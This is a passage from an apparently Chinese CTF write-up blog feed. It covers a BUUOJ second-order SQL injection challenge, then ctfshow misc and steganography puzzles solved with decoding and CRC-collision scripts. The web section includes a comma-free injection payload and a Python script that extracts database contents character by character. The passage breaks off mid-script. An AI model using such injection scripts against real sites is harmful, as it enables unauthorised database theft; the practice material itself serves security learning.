        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="二次注入？"><a href="#二次注入？" class="headerlink" title="二次注入？"></a>二次注入？</h3><p>开始给了一个登录的页面，emmm，猜测register.php(当然你也可以扫一下)，注册之后登陆然后进入主页，主页有用户名，判断有二次注入，算是半拉盲注？然后可以测试一下单引号，双引号，然后就是单引号闭合，emmm过滤了<code>,</code>可以用下面的语句注入<br><pre class="line-numbers language-none"><code class="language-none">&#39;+ascii(substr((database()) from &quot; + str(i) + &quot; for 1))+&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>emmm，表名要猜？！！好家伙，我也不会，贴下俺根据wp写的脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------.</span><span class="token comment"># @Author  : M4XLMUM                                  |</span><span class="token comment"># @website : http://a16n.github.io or http://a16ne.cn |</span><span class="token comment"># -----------------------------------------------------.</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">get_database</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 注册部分</span>    url <span class="token operator">=</span> <span class="token string">"http://c20af613-209f-4645-b6fa-a362921f30fc.node3.buuoj.cn/"</span>    register_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"11"</span>    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"register.php"</span><span class="token punctuation">,</span> register_data<span class="token punctuation">)</span>    register_text <span class="token operator">=</span> response<span class="token punctuation">.</span>text    <span class="token comment"># 登陆部分</span>    login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"11"</span>    <span class="token punctuation">&#125;</span>    login_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"login.php"</span><span class="token punctuation">,</span> login_data<span class="token punctuation">)</span>    login_text <span class="token operator">=</span> login_response<span class="token punctuation">.</span>text    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>login_text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span>    get_username <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    sql_username <span class="token operator">=</span> get_username<span class="token punctuation">.</span>text    sql_username <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span>sql_username<span class="token punctuation">)</span>  <span class="token comment"># 获取index页面的用户名</span>    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sql_username<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>sql_username<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token triple-quoted-string string">'''str_database = ''for i in range(1, 10):    username = "0'+ascii(substr((database()) from " + str(i) + " for 1))+'0"    email = str(i) + "13@qq.com"    if get_database(username, email) != 0:        str_database += get_database(username, email)    else:        breakprint(str_database)'''</span>str_flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> <span class="token string">"'+ascii(substr((select * from flag) from "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" for 1))+'"</span>    email <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"16@qq.com"</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> get_database<span class="token punctuation">(</span>username<span class="token punctuation">,</span> email<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        str_flag <span class="token operator">+=</span> get_database<span class="token punctuation">(</span>username<span class="token punctuation">,</span> email<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str_flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>注意那个email经过一次测试要换一下字符串里的内容，emmm要不查出来的用户名还是那个用户名。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow之misc题目练习</title>
      <link href="2021/02/24/ctfshow%E4%B9%8Bmisc%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
      <url>2021/02/24/ctfshow%E4%B9%8Bmisc%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><p>伪加密，倒数第二个PK后的09 00 改为 00 00即可<br><code>flag&#123;79ddfa61bda03defa7bfd8d702a656e4&#125;</code></p><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>打开压缩包是名为file的文件，没有文件后缀名，直接用记事本打开看到文件头部分有个FAT，查了百度之后是MS-DOS的文件配置表？然后提示<code>偶然发现我竟然还有个软盘，勾起了我的回忆。</code>，呼呼，用vmware添加一个虚拟机（不添加iso文件的那种），添加软盘驱动器，使用的软盘映像文件就是刚才解压出来的file文件，打开虚拟机后就显示出了flag:::<code>flag&#123;ctfshow&#125;</code></p><h3 id="miscx"><a href="#miscx" class="headerlink" title="miscx"></a>miscx</h3><p>misc1.zip文件没有加密，拉出来。<br>然后misc1文件里面还是有一个加密了，一个图片没有加密，把图片拉出来看一看。<br>图片上面是2020，猜测为misc1.zip文件的密码，借此将misc1文件里面的那个文件(music.docx)拉出来。<br><pre class="line-numbers language-none"><code class="language-none">♭‖♭‖‖♯♭♭♬‖♩♫‖♬∮♭♭¶♭‖♯‖¶♭♭‖∮‖‖♭‖§♭‖♬♪♭♯§‖‖♯‖‖♬‖‖♪‖‖♪‖¶§‖‖♬♭♯‖♭♯♪‖‖∮‖♬§♭‖‖‖♩♪‖‖♬♭♭♬‖♩♪‖♩¶‖♩♪‖♩♬‖¶§‖‖♩‖¶♫♭♭♩‖♬♯‖♬§♭‖♭‖♩¶‖‖∮♭♭♬‖‖♭‖♫§‖¶♫‖♩∮♭♭§‖♭§‖♭§§&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>音符加密，以前做题的时候遇到过，解密后为<code>U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</code><br>Rabbit在线解密后为<code>welcome_to_payhelp</code>，—-秘钥为<code>2020</code><br>上面的那个就是misc2文件的密码，直接解压misc2.zip文件。<br>Hint.txt文件里面的内容为<br><pre class="line-numbers language-none"><code class="language-none">VmpKMFUxTXhXWGxVV0dob1RUSjRVVll3V2t0aFJscDBZMGhLYTAxWGVIaFZiRkpUWWtaYVZWSnJXbFpOVjJoeVZYcEdZVkpzVG5KVWJHaHBWa1ZWZDFkV1ZtRmtNRFZYVjJ4c2FWSlVWbFJVVnpWdVRXeFZlV1ZHVGxSaVZrWTBXVlJPYzFWR1pFZFRiVGxYWW01Q1dGcEdXbE5UUjBZMlVXMTBWMWRGU2xkV1ZtUXdVekpGZUZOWWJHaFRSVFZWV1d0YVMxTXhjRVZUYTFwc1ZteHdlRlp0ZERCV01VcFlaRE53V0Zac2NIWldSekZMVW1zeFdWSnNTbWxXUjNodlZtMXdUMkl5Vm5OaVNGWnBVbXh3YzFac1VrZFNiRlY0WVVkMFZXSlZXbmxWYlRWUFZsWlplbEZyWkZSaVJrcFFWV3hGYkUwd1VXeE5NRkVsTTBRJTNE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>BASE64解密，<code>welcome_to_2020%0Aflag%20is%20coming...%0Athe%20key%20is%20hello%202020%21</code>URLdecode得<br><pre class="line-numbers language-none"><code class="language-none">welcome_to_2020flag is coming...the key is hello 2020!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>所以另一个文件flag.txt的密码为<code>hello 2020!</code><br>解压出文件得flag:::<code>flag&#123;g00d_f0r_y0u&#125;</code></p><h3 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h3><p>压缩包里面是一张图片，里面估计是藏的有东西，那就用foremost分离出来。<br>分离出来了一个rar文件和一张图片，rar里面是一个flag.zip的文件，有密码，试试ziperello这个软件看看有没有密码。<br>是真加密了，直接爆破得密码为<code>123456</code>，解压出文件，里面一堆数字，估计又要写脚本。<br>再看png，用一下strings命令得出一段base加密后的字符串<code>Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</code>，一个64，一个32之后得<code>KEY&#123;Lazy_Man&#125;</code><br>。。。然后就是那么多数字了，转成十六进制文件，这这这。。。下面这是网上的。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        content<span class="token operator">=</span>fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> contentnumber <span class="token operator">=</span> read_file<span class="token punctuation">(</span><span class="token string">'thienc.txt'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'.&#123;2&#125;'</span><span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">)</span>result <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>strings <span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>    y <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    z <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>    z<span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"b'(.*?)'"</span><span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    strings <span class="token operator">+=</span> zb<span class="token operator">=</span> strings<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>strings<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> b<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        i<span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> i    strings <span class="token operator">+=</span>i<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"complete！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>总之就是十进制-&gt;十六进制-&gt;ascii-&gt;去掉<code>0x</code>-&gt;写入文件<br>7z文件还有加密，密码为<code>KEY&#123;Lazy_Man&#125;</code><br>抄网上的base脚本解下文件内容<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 算法逆向破解</span><span class="token comment"># 加密函数，flag是某个字符串</span><span class="token keyword">import</span> random<span class="token keyword">import</span> base64<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    bcode <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'16'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b16encode<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 使用lambda表达式对x进行base64编码</span>        <span class="token string">'32'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b32encode<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'64'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># 字符串在Python内部的表示是unicode编码</span>    <span class="token comment"># 因此，在做编码转换时，通常需要以unicode作为中间编码，即先将其他编码的字符串解码（decode）成unicode，再从unicode编码（encode）成另一种编码。</span>    msg <span class="token operator">=</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># encode的作用是将unicode编码转换成其他编码的字符串</span>    <span class="token comment"># 加密过程</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        order <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'64'</span><span class="token punctuation">,</span> <span class="token string">'32'</span><span class="token punctuation">,</span> <span class="token string">'16'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        msg <span class="token operator">=</span> bcode<span class="token punctuation">[</span>order<span class="token punctuation">]</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        <span class="token comment"># print('&#123;&#125;:&#123;&#125;'.format(order, msg))</span>    msg <span class="token operator">=</span> msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># decode的作用是将其他编码的字符串转换成unicode编码</span>    <span class="token keyword">return</span> msgcipherText <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"secenc.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">#= enc("flag&#123;****some secret****&#125;")</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"密文是："</span><span class="token punctuation">,</span> cipherText<span class="token punctuation">)</span><span class="token comment"># 根据base16,32,64之间的编码形式不同进行破解</span><span class="token comment"># Base64：</span><span class="token comment"># 包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+/，"="个数的取值范围为&#123;0,1,2&#125;;</span><span class="token comment">#</span><span class="token comment"># Base32:</span><span class="token comment"># 而Base32中只有大写字母（A-Z）和数字234567，"="个数的取值范围为&#123;0,1,3,4,6&#125;；</span><span class="token comment">#</span><span class="token comment"># Base16:</span><span class="token comment"># 而Base16就是16进制，他的范围是数字(0-9)，字母（ABCDEF）；</span><span class="token comment"># dcode = [lambda x: base64.b16decode(x), lambda x: base64.b32decode(x), lambda x: base64.b64decode(x)]</span>base64Patter <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'[A-Za-z0-9+/]'</span><span class="token punctuation">)</span>base32Patter <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'[^A-Z2-7]'</span><span class="token punctuation">)</span>base16Patter <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'[^G-Z]'</span><span class="token punctuation">)</span><span class="token comment"># findall可以获取字符串中所有匹配的字符串，返回一个列表。</span><span class="token comment"># results = re.findall(p,source)</span><span class="token comment"># print(results)</span>dcode <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'16'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b16decode<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 使用lambda表达式对x进行base64编码</span>    <span class="token string">'32'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b32decode<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'64'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>msg <span class="token operator">=</span> cipherText<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token comment"># text = 'GHIL'.encode('utf-8')</span><span class="token comment"># if re.search(b'[^G-Z]', text) != None:   # 不要G-Z</span><span class="token comment">#     print('符合要求')</span><span class="token comment"># else:</span><span class="token comment">#     print("不符合要求")</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">b'.*[a-z].*'</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>  <span class="token comment"># 包含a-z，只有base64</span>        msg <span class="token operator">=</span> dcode<span class="token punctuation">[</span><span class="token string">'64'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token keyword">elif</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">b'.*[G-Z].*'</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>  <span class="token comment"># base16编码中没有G-Z，如果编码中有G-Z，说明是base32</span>        msg <span class="token operator">=</span> dcode<span class="token punctuation">[</span><span class="token string">'32'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        msg <span class="token operator">=</span> dcode<span class="token punctuation">[</span><span class="token string">'16'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"明文是："</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>base64与base32混合解密。<br>得出来<code>?!.</code>的混合，是Ook!然后brainfuck解密<br><pre class="line-numbers language-none"><code class="language-none">flag&#123;Welc0me_tO_cTf_3how!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>太强了。。。</p><h3 id="misc30之一"><a href="#misc30之一" class="headerlink" title="misc30之一"></a>misc30之一</h3><p>1.这里给一个rar的文件，改文件名为1.rar，拉出来星空.jpg，详细信息有解压密码<code>little stars</code>，解压出了doc文档。<br>2.全选内容，字体颜色改为蓝色发现提示<br><pre class="line-numbers language-none"><code class="language-none">你知道梵高的星空吗？Hello friend!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>密码就是英文的这些，再解压得<br>3.拉出来flag.png，扫码<code>flag&#123;welcome_to_ctfshow&#125;</code></p><h3 id="stega1"><a href="#stega1" class="headerlink" title="stega1"></a>stega1</h3><p>1.用jphs_seek没密码<code>flag&#123;3c87fb959e5910b40a04e0491bf230fb&#125;</code></p><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><pre class="line-numbers language-none"><code class="language-none">密文：zse4rfvsdf 6yjmko0提示1：解密后两个字符,小写 提示2：看看自己下面提交flag&#123;明文&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看下面，哦，原来是键盘，我还以为是…<br><code>flag&#123;av&#125;</code></p><h3 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h3><p>二维码扫一下<code>flag不在这里哦~~</code>，用winhex打开发现文件尾有一串brainfuck解密后得<code>和谐民主和谐文明和谐和谐和谐自由和谐平等和谐公正</code>，再解一下社会主义核心价值观编码<code>123456</code>，解出来应该是mp3stego得<br><pre class="line-numbers language-none"><code class="language-none">hint：静默之眼对了~另一个音乐的密码是abc123哦你马上就成功了！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>解压出另一个音乐文件。提示silenteye，是另一种加密，下载软件silenteye。<br>另一个线索<code>110001010100011101</code>转为十进制为<code>202013</code>，是wav的密码。<br>解密得flag，AES128，202013得<code>flag&#123;C0ngr4tul4ti0n!&#125;</code></p><h3 id="misc30之二"><a href="#misc30之二" class="headerlink" title="misc30之二"></a>misc30之二</h3><p>伪加密解出来音频，有一张图片，foremost分离出来，修改高度发现信息。高度可以将图片的宽高转为十六进制再在winhex下面查找一下<code>01 73 03 7F</code>，找到后修改下获得猪圈密码<code>01 改为 02 即可</code>。<br><a href="http://ctf.ssleye.com/pigpen.html">这个网站还算好用</a><br><code>flag&#123;well done&#125;</code></p><h3 id="红包题第一弹"><a href="#红包题第一弹" class="headerlink" title="红包题第一弹"></a>红包题第一弹</h3><p>解压出来86张照片，每张图片的文件尾的<code>;</code>之后都有一段是base64的片段，写个脚本提取一下，放在一个txt文件内，下面是自己写的脚本。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         1</span><span class="token comment"># Description:  </span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2021/3/6</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> content<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"res.txt"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    jpg <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg'</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>extract<span class="token punctuation">(</span>jpg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'successful!'</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后base64转图片获得二维码，扫描得flag。<br><code>flag&#123;gif_is_so_easy&#125;</code></p><h3 id="stega10"><a href="#stega10" class="headerlink" title="stega10"></a>stega10</h3><p>heart里面有一段base64，解码后是一个zip的链接，下载后里面有密码(未加密)和n.zip(加密)，密码目录下有加密的密码1-9.txt文件，每个文件占一个字节，crc碰撞，下面是脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         CrcCrash</span><span class="token comment"># Description:  for txt file to crash crc</span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2021/3/7</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> string<span class="token keyword">import</span> binasciidic <span class="token operator">=</span> string<span class="token punctuation">.</span>printable   <span class="token comment">#猜测文件内容的字典</span><span class="token keyword">def</span> <span class="token function">getCrc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">zip</span> <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"flag.zip"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>    zip_list <span class="token operator">=</span> <span class="token builtin">zip</span><span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span>    crclist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> txt <span class="token keyword">in</span> zip_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'.txt'</span> <span class="token keyword">in</span> txt<span class="token punctuation">:</span>            crclist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span>txt<span class="token punctuation">)</span><span class="token punctuation">.</span>CRC<span class="token 